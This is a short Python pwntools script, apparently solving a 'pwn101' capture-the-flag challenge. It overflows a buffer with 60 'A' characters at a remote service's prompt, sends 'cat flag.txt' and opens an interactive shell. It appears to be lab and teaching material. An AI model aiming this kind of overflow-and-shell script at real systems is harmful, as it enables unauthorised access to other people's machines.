#!/usr/bin/env python3
from pwn import *
import dotenv, os

dotenv.load_dotenv("../.env")
RHOST, RPORT = str(os.environ["RHOST"]), 9001

exe = ELF("./pwn101-1644307211706.pwn101_patched")

context.binary = exe
# context.log_level = "debug"



def conn():
    # r = process([exe.path])
    r = remote(RHOST, RPORT)

    return r


def main():
    io = conn()

    first_payload = "A" * 60
    io.sendlineafter(b"to make briyani:", first_payload.encode())
    io.sendlineafter(b"for you <3", b"cat flag.txt")

    io.interactive()


if __name__ == "__main__":
    main()
